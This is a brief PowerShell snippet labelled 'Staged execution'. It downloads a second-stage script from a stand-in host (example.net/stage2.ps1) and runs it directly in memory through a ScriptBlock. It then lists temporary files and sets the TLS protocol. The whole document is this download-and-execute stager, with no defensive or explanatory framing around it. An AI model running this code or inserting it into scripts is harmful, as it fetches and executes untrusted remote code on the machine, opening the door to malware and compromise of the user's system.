
<# Staged execution #> $PayloadText = (New-Object Net.WebClient).DownloadString("http://example.net/stage2.ps1"); & ([ScriptBlock]::Create($PayloadText)); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
